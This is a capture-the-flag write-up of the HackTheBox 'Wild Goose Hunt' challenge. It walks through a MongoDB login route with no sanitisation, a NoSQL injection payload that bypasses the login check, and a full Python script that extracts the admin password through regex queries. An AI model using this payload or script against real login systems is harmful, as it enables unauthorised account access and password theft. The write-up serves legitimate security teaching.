# :game_die: HTB Challenge Write-Up: Wild Goose Hunt

> **Original Source:** [HTB Challenge Write-Up: Wild Goose Hunt](https://infosecwriteups.com/htb-challenge-write-up-wild-goose-hunt-a3e3a20e7b21)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

# HTB Challenge Write-Up: Wild Goose Hunt


## Code Review


The Wild Goose Hunt is a retro-styled web login form with two routes: one for displaying the form and another for the login logic.


At first glance, its routes tell us that it's using a *NoSQL *database. Looking into the User model confirms that it's using MongoDB, a NoSQL database.


There is no input sanitization or filtering, allowing us to test for *NoSQL Injection *or* NoSQLi *without needing to bypass any measures.


```
router.post('/api/login', (req, res) => {
let { username, password } = req.body;

if (username && password) {
return User.find({
username,
password
})
// Codes omitted for brevity
});
```


## Local Testing


Let's begin by running the application locally using the `build_docker.sh` script. We will use the built-in browser of Burp Suite to capture the HTTP traffic and resend modified payloads to `/api/login`.


The `entrypoint.sh` file shows that the flag is the admin user’s password. To simplify the exploit, we will brute-force this field using NoSQLi. Let's send a login request using Burp Suite Repeater with the following payload:


```
username=admin&password[$gt]=
```


That worked! Here, we are using MongoDB’s *Comparison Query Operators*. The payload indicates “any password value greater than an empty string.”


## Get Pat Bautista’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Now that we have proven that the application is vulnerable to NoSQLi, it's time to write a Python script to brute-force the password.

## Exploitation


Let’s start by developing an *oracle*—a function designed to verify the success of the payload. This function is straightforward; it takes a dictionary where we can input our NoSQLi payload for the password field and send it using Python's `requests` library.


```
def oracle(payload: dict) -> bool:
data = { "username":"admin" } | payload
header = { "Content-Type": "application/x-www-form-urlencoded" }
response = requests.post(f"http://{target}/api/login", data=data, headers=header)
return "Login Successful, welcome back admin." in response.text
```


The next step is to determine the password length. We will use the `$regex` operator, one of MongoDB’s *Evaluation Query Operators*.


```
length = 0
for n in range(1, 100):
# e.g. username=admin&password[$regex]=^.{1}$
if oracle({ "password[$regex]": f"^.{{{n}}}$" }):
print("[*] Length found:", n)
length = n
break
```


After determining the length, let’s check each character of the password to see if it matches any `printable` characters.


```
password = ""
for pos in range(length):
for character in printable:
# ensure that special characters are properly escaped
if oracle({ "password[$regex]": f"^{re.escape(password + character)}.*$" }):
print("[*] Character found:", character)
password += character
break
```


Bringing everything together.


```
import requests
import re
from string import printable

target = "83.136.254.158:44757" # change this

def oracle(payload: dict) -> bool:
data = { "username":"admin" } | payload
header = { "Content-Type": "application/x-www-form-urlencoded" }
response = requests.post(f"http://{target}/api/login", data=data, headers=header)
return "Login Successful, welcome back admin." in response.text

length = 0
for n in range(1, 100):
# e.g. username=admin&password[$regex]=^.{1}$
if oracle({ "password[$regex]": f"^.{{{n}}}$" }):
print("[*] Length found:", n)
length = n
break

password = ""
for pos in range(length):
for character in printable:
# ensure that special characters are properly escaped
if oracle({ "password[$regex]": f"^{re.escape(password + character)}.*$" }):
print("[*] Character found:", character)
password += character
break

print("[*] Password found:", password)
```


The exploit takes some time, but it has successfully brute-forced the password.


We have successfully captured the flag!


## References

---

*Originally published on [Medium](https://infosecwriteups.com/htb-challenge-write-up-wild-goose-hunt-a3e3a20e7b21). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
